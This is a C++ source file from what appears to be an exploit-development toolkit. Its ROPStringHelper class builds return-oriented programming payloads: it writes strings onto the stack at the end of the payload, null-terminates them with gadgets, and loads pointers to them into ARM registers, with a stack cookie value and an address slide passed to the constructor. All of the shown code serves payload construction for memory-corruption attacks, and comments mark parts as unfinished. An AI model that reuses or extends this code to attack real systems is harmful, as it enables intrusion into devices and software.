// ########################
// ropstringhelper.cpp
// ########################

#include "main.h"
//#include "GadgetHelper.h"
#include "ROPStringHelper.h"

ROPStringHelper::ROPStringHelper(uint cookieValue, uint slideValue,
				 const char* fileName, uint maxSize) : 
  GadgetHelper(cookieValue, slideValue, fileName, maxSize) {
  // strings will be written onto the stack, 
  // after all the gadgets
  // need to estimate total gadget size below
  _last_s_offset = 0;
}

// clears r0 (tofix)
// store string on stack with r pointing to it
// return: string 1 pos
uint ROPStringHelper::mov_r_str_helper(const char* str1,
				       BYTE setToBeginning /* = FALSE */) {
  uint s1_size = strlen(str1);
  int s1_pos; // can be negative

  if (DEBUG_PAYLOAD)
	printf("%s\n", __FUNCTION__);

  // switching back and forth for the string location doesn't work
  // todo
  setToBeginning = FALSE;

  if (!setToBeginning) {
	if (!_last_s_offset) {
	  // store at the end of the payload
	  _last_s_offset = getMaxROPSize() - s1_size - 4;
	}
	else {
	  // use 4 bytes because of the set to 0
	  _last_s_offset -= s1_size + 4;
	}
  }
  else {
	// feature not tested (todo)

	if (!_last_s_offset) {
	  // store at the end of the payload
	  _last_s_offset = 0 + 0x28;
	}
	else {
	  _last_s_offset += s1_size + 4;
	}
  }

	// store strings at 65%
	//	_last_s_offset = getMaxROPSize() - 
	//	  (getMaxROPSize() / 10 * 3.5);


	//	_last_s_offset = getMaxROPSize() - 
	//	  (getMaxROPSize() / 10 * 2.6);

	// load string below PC
	//	_last_s_offset = -50;

  //  printf("[0x%x] [%d] [0x%x]\n", getInitialPC(), _last_s_offset, _payload);
  //  memcpy((int*)getInitialPC() + _last_s_offset, str1, s1_size);

  if (!areZerosAllowed()) {
	memcpy(getPayload() + _last_s_offset, str1, s1_size);
  }
  else {
	BYTE *str_offset = getPayload() + _last_s_offset;
	strncpy((char*)str_offset, str1, s1_size);
	*(str_offset + s1_size) = 0;
  }

  s1_pos = _last_s_offset - getPCLoc() - 0x28;
  
  if (DEBUG)
	printf("mov_r_str: s1_pos: %d, s1_size: %d, "
		   "last_offset: %d, maxROP: %d (0x%x)\n", 
		   s1_pos, s1_size, _last_s_offset, 
		   getMaxROPSize(), getMaxROPSize());
  
  if (!areZerosAllowed()) {  
	// set a 0, with gadgets, to the end of the string
	// clears r0, r1 and r4 (tofix)
	str_0_sp_x(s1_pos + s1_size);
  }

  return s1_pos;
}

void ROPStringHelper::mov_r_str(uint reg, const char* str1, BYTE setToBeginning /* = FALSE */) {
  // clears r0, r1 and r4
  uint s1_pos = mov_r_str_helper(str1, setToBeginning);
  // clears r4
  mov_r_sp_x(reg, s1_pos);
}


void ROPStringHelper::r0_str1__r1_str2(const char* str1,
									   const char* str2,
									   BYTE setToBeginning /* = FALSE */) {
  if (DEBUG_PAYLOAD)
	printf("%s\n", __FUNCTION__);

  // clears r0, r1 and r4
  uint s1_pos = mov_r_str_helper(str1, setToBeginning);
  uint s2_pos = mov_r_str_helper(str2, setToBeginning);
  // clears r4 and r0
  mov_r_sp_x(1, s2_pos);  
  mov_r_sp_x(0, s1_pos);  
}

